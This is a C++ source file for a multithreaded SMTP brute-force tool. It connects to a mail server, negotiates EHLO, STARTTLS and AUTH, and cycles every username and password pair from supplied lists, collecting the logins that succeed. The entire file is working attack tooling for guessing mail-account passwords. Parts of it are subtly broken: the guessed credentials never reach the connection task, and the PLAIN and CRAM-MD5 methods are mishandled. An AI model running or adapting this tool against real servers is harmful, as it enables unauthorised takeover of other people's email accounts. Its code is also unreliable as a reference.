#include "smtp_bruteforcer.h"
#include <chrono>
#include <thread>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <cctype>

namespace smtp {

// SMTPBruteForceTask Implementation
SMTPBruteForceTask::SMTPBruteForceTask(const SMTPConfig& config)
    : config_(config) {
    SetTimeout(std::chrono::seconds(config.timeout_seconds));
}

SMTPBruteForceTask::~SMTPBruteForceTask() {
    Cleanup();
}

bool SMTPBruteForceTask::Initialize() {
    if (!SocketTask::Initialize()) {
        return false;
    }

    state_ = SMTPState::INIT;
    retry_count_ = 0;
    auth_in_progress_ = false;
    supported_auth_methods_.clear();

    return true;
}

TaskStatus SMTPBruteForceTask::Execute() {
    try {
        std::string response;
        
        switch (state_) {
            case SMTPState::INIT:
                if (!HandleConnect()) {
                    return TaskStatus::ERROR;
                }
                state_ = SMTPState::CONNECTED;
                return TaskStatus::CONTINUE;

            case SMTPState::CONNECTED:
                if (!HandleEHLO()) {
                    return TaskStatus::ERROR;
                }
                state_ = SMTPState::EHLO_SENT;
                return TaskStatus::CONTINUE;

            case SMTPState::EHLO_SENT:
                if (config_.use_tls && !HandleStartTLS()) {
                    return TaskStatus::ERROR;
                }
                if (!HandleAuth()) {
                    return TaskStatus::ERROR;
                }
                state_ = SMTPState::AUTH_STARTED;
                return TaskStatus::CONTINUE;

            case SMTPState::AUTH_STARTED:
                if (!HandleUsername()) {
                    return TaskStatus::ERROR;
                }
                state_ = SMTPState::AUTH_USERNAME;
                return TaskStatus::CONTINUE;

            case SMTPState::AUTH_USERNAME:
                if (!HandlePassword()) {
                    return TaskStatus::ERROR;
                }
                state_ = SMTPState::AUTH_PASSWORD;
                return TaskStatus::CONTINUE;

            case SMTPState::AUTH_PASSWORD:
                if (!ProcessResponse(response)) {
                    return TaskStatus::ERROR;
                }
                state_ = SMTPState::AUTH_COMPLETE;
                return TaskStatus::SUCCESS;

            case SMTPState::ERROR:
                return TaskStatus::ERROR;

            default:
                return TaskStatus::ERROR;
        }
    }
    catch (const SMTPException& e) {
        if (++retry_count_ < config_.retry_count) {
            Initialize();
            return TaskStatus::CONTINUE;
        }
        return TaskStatus::ERROR;
    }
}

void SMTPBruteForceTask::Cleanup() {
    SocketTask::Cleanup();
    state_ = SMTPState::INIT;
    auth_in_progress_ = false;
}

bool SMTPBruteForceTask::HandleConnect() {
    if (!Connect(config_.host, config_.port)) {
        throw SMTPConnectionException("Failed to connect to SMTP server");
    }

    std::string response;
    if (!ReadResponse(response) || !utils::IsSuccessResponse(response)) {
        throw SMTPConnectionException("Invalid server greeting: " + response);
    }

    return true;
}

bool SMTPBruteForceTask::HandleEHLO() {
    std::string ehlo_cmd = "EHLO " + config_.domain + "\r\n";
    if (!SendCommand(ehlo_cmd)) {
        throw SMTPException("Failed to send EHLO command");
    }

    std::string response;
    if (!ReadResponse(response)) {
        throw SMTPException("Failed to read EHLO response");
    }

    supported_auth_methods_ = GetSupportedAuthMethods(response);
    if (supported_auth_methods_.empty()) {
        throw SMTPAuthException("No supported authentication methods found");
    }

    return true;
}

bool SMTPBruteForceTask::HandleStartTLS() {
    if (!SendCommand("STARTTLS\r\n")) {
        throw SMTPException("Failed to send STARTTLS command");
    }

    std::string response;
    if (!ReadResponse(response) || !utils::IsSuccessResponse(response)) {
        throw SMTPException("STARTTLS failed: " + response);
    }

    if (!EnableTLS()) {
        throw SMTPException("Failed to establish TLS connection");
    }

    // After STARTTLS, we need to send EHLO again
    return HandleEHLO();
}

bool SMTPBruteForceTask::HandleAuth() {
    AuthMethod method = config_.auth_method;
    if (method == AuthMethod::AUTO) {
        // Try methods in preferred order
        for (const auto& supported : supported_auth_methods_) {
            method = utils::ParseAuthMethod(supported);
            if (method != AuthMethod::AUTO) {
                break;
            }
        }
    }

    std::string auth_cmd = "AUTH " + utils::GetAuthMethodString(method) + "\r\n";
    if (!SendCommand(auth_cmd)) {
        throw SMTPException("Failed to send AUTH command");
    }

    std::string response;
    if (!ReadResponse(response) || !utils::IsSuccessResponse(response)) {
        throw SMTPAuthException("Authentication initialization failed: " + response);
    }

    current_auth_method_ = method;
    return true;
}

bool SMTPBruteForceTask::HandleUsername() {
    std::string encoded_username = base64::Encode(current_username_);
    if (!SendCommand(encoded_username + "\r\n")) {
        throw SMTPException("Failed to send username");
    }

    std::string response;
    if (!ReadResponse(response) || !utils::IsSuccessResponse(response)) {
        throw SMTPAuthException("Username rejected: " + response);
    }

    return true;
}

bool SMTPBruteForceTask::HandlePassword() {
    std::string encoded_password = base64::Encode(current_password_);
    if (!SendCommand(encoded_password + "\r\n")) {
        throw SMTPException("Failed to send password");
    }

    return true;
}

bool SMTPBruteForceTask::ProcessResponse(std::string& response) {
    if (!ReadResponse(response)) {
        throw SMTPException("Failed to read authentication response");
    }

    AuthResult result;
    result.success = utils::IsSuccessResponse(response);
    result.response_code = utils::GetResponseCode(response);
    result.error_message = response;
    result.username = current_username_;
    result.password = current_password_;

    if (auth_callback_) {
        auth_callback_(result);
    }

    return result.success;
}

bool SMTPBruteForceTask::SendCommand(const std::string& command) {
    return Send(command.c_str(), command.length()) == static_cast<int>(command.length());
}

bool SMTPBruteForceTask::ReadResponse(std::string& response) {
    char buffer[1024];
    response.clear();
    
    while (true) {
        int bytes_read = Receive(buffer, sizeof(buffer) - 1);
        if (bytes_read <= 0) {
            return false;
        }

        buffer[bytes_read] = '\0';
        response += buffer;

        // Check if we have a complete response
        if (response.length() >= 4 && 
            response[3] == ' ' && 
            std::isdigit(response[0]) && 
            std::isdigit(response[1]) && 
            std::isdigit(response[2])) {
            break;
        }
    }

    return true;
}

std::vector<std::string> SMTPBruteForceTask::GetSupportedAuthMethods(const std::string& ehlo_response) {
    std::vector<std::string> methods;
    std::istringstream iss(ehlo_response);
    std::string line;

    while (std::getline(iss, line)) {
        if (line.find("AUTH ") != std::string::npos) {
            std::istringstream auth_line(line.substr(line.find("AUTH ") + 5));
            std::string method;
            while (auth_line >> method) {
                methods.push_back(method);
            }
            break;
        }
    }

    return methods;
}

// SMTPBruteForcer Implementation
SMTPBruteForcer::SMTPBruteForcer(const SMTPConfig& config, const BruteForceParams& params)
    : config_(config), params_(params) {
}

SMTPBruteForcer::~SMTPBruteForcer() {
    Stop();
}

bool SMTPBruteForcer::Start() {
    if (running_) {
        return false;
    }

    running_ = true;
    stop_requested_ = false;
    attempts_count_ = 0;
    successful_auths_.clear();

    // Create worker threads
    for (size_t i = 0; i < params_.max_concurrent_connections; ++i) {
        worker_threads_.emplace_back(new std::thread(&SMTPBruteForcer::WorkerThread, this));
    }

    return true;
}

void SMTPBruteForcer::Stop() {
    stop_requested_ = true;
    
    for (auto& thread : worker_threads_) {
        if (thread && thread->joinable()) {
            thread->join();
        }
    }

    worker_threads_.clear();
    running_ = false;
}

std::vector<AuthResult> SMTPBruteForcer::GetResults() const {
    std::lock_guard<std::mutex> lock(results_mutex_);
    return successful_auths_;
}

void SMTPBruteForcer::WorkerThread() {
    while (!stop_requested_) {
        auto [username, password] = GetNextCredentials();
        if (username.empty() && password.empty()) {
            break;
        }

        SMTPBruteForceTask task(config_);
        task.SetAuthCallback([this](const AuthResult& result) {
            ProcessResult(result);
        });

        if (task.Initialize()) {
            task.Execute();
        }

        attempts_count_++;
        
        if (progress_callback_) {
            size_t total = params_.usernames.size() * params_.passwords.size();
            progress_callback_(total, attempts_count_);
        }
    }
}

void SMTPBruteForcer::ProcessResult(const AuthResult& result) {
    if (result.success) {
        std::lock_guard<std::mutex> lock(results_mutex_);
        successful_auths_.push_back(result);
        
        if (success_callback_) {
            success_callback_(result);
        }

        if (params_.stop_on_success) {
            stop_requested_ = true;
        }
    }
}

std::pair<std::string, std::string> SMTPBruteForcer::GetNextCredentials() {
    std::lock_guard<std::mutex> lock(credentials_mutex_);
    
    if (current_user_index_ >= params_.usernames.size()) {
        return {"", ""};
    }

    std::string username = params_.usernames[current_user_index_];
    std::string password = params_.passwords[current_pass_index_];

    current_pass_index_++;
    if (current_pass_index_ >= params_.passwords.size()) {
        current_pass_index_ = 0;
        current_user_index_++;
    }

    return {username, password};
}

// Utility functions implementation
namespace utils {

std::string GetAuthMethodString(AuthMethod method) {
    switch (method) {
        case AuthMethod::LOGIN: return "LOGIN";
        case AuthMethod::PLAIN: return "PLAIN";
        case AuthMethod::CRAM_MD5: return "CRAM-MD5";
        default: return "LOGIN";
    }
}

AuthMethod ParseAuthMethod(const std::string& method_str) {
    std::string upper_method = method_str;
    std::transform(upper_method.begin(), upper_method.end(), 
                  upper_method.begin(), ::toupper);
    
    if (upper_method == "LOGIN") return AuthMethod::LOGIN;
    if (upper_method == "PLAIN") return AuthMethod::PLAIN;
    if (upper_method == "CRAM-MD5") return AuthMethod::CRAM_MD5;
    return AuthMethod::AUTO;
}

bool IsSuccessResponse(const std::string& response) {
    if (response.length() < 3) return false;
    int code = GetResponseCode(response);
    return code >= 200 && code < 400;
}

int GetResponseCode(const std::string& response) {
    if (response.length() < 3) return 0;
    try {
        return std::stoi(response.substr(0, 3));
    } catch (...) {
        return 0;
    }
}

} // namespace utils
} // namespace smtp 